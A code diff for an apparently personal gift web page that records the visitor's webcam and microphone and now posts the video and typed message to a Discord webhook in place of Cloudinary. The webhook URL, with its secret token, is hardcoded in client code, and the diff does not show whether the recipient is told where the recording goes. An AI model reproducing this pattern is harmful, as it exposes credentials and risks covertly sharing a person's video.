@@ -4,8 +4,9 @@ let mediaRecorder;
 let recordedChunks = [];
 let stream;
 
-// Initialize Cloudinary
-const cl = cloudinary.Cloudinary.new({ cloud_name: "c4zkzlpm" });
+// ========== DISCORD WEBHOOK ==========
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522204310757441598/8Top4dxtPXmuUk6Ql1ZCExIHLbonMfyzYQslYFoawdlSchpkudulrdmpsxPLeOSDapFW";
+// =====================================
 
 function showScreen(screenId) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -55,6 +56,7 @@ async function startRecording() {
     if (recordingStarted) return;
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        // Use low bitrate to keep video under 8MB for Discord
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 500000 });
         recordedChunks = [];
         mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
@@ -220,7 +222,7 @@ function setupMemories() {
     }, 5000);
 }
 
-// Finale – Cloudinary SDK Upload
+// Finale – Discord Upload
 function setupFinale() {
     document.getElementById('submitFinalBtn').addEventListener('click', async () => {
         const msg = document.getElementById('finalMessage').value;
@@ -228,34 +230,21 @@ function setupFinale() {
 
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
-            mediaRecorder.onstop = () => {
+            mediaRecorder.onstop = async () => {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 stream.getTracks().forEach(t => t.stop());
 
-                // Upload video
-                cl.uploader.upload(blob, {
-                    upload_preset: "poochi_gift",
-                    folder: "poochi_gift",
-                    resource_type: "video"
-                }, (error, result) => {
-                    if (error) {
-                        alert('Video upload failed: ' + error.message);
-                        return;
-                    }
-                    // Upload message as text file
-                    const textBlob = new Blob([msg], { type: 'text/plain' });
-                    cl.uploader.upload(textBlob, {
-                        upload_preset: "poochi_gift",
-                        folder: "poochi_gift",
-                        resource_type: "raw",
-                        public_id: "message-" + Date.now(),
-                        format: "txt"
-                    }, (err, res) => {
-                        if (err) {
-                            alert('Message upload failed: ' + err.message);
-                            return;
-                        }
-                        // Success
+                // Discord FormData (file must be <8MB)
+                const formData = new FormData();
+                formData.append('file', blob, 'recording.webm');
+                formData.append('content', 'Saba ka message: ' + (msg || 'No text'));
+
+                try {
+                    const res = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (res.ok) {
                         document.getElementById('uploadStatus').textContent = 'Sab kuch save ho gaya! ❤️';
                         document.getElementById('finaleForm').style.display = 'none';
                         document.getElementById('finaleSky').classList.add('fireworks-effect');
@@ -267,8 +256,13 @@ function setupFinale() {
                             document.getElementById('letterContent').innerHTML =
                                 "Har subah sirf aapki yaad aati hai.<br>Jab aap door hoti hain toh har pal adhoora lagta hai. Aap meri zindagi ki sabse khoobsurat kahani hain. Har khushi mein aapka saath chahiye, har mushkil mein aapka haath thaamna chahta hoon. I miss you more than words can say.<br><br>You are my forever.";
                         }, { once: true });
-                    });
-                });
+                    } else {
+                        const errData = await res.json();
+                        alert('Discord upload failed: ' + (errData.message || 'Unknown'));
+                    }
+                } catch (e) {
+                    alert('Network error: ' + e.message);
+                }
             };
         } else {
             alert('Recording not active.');
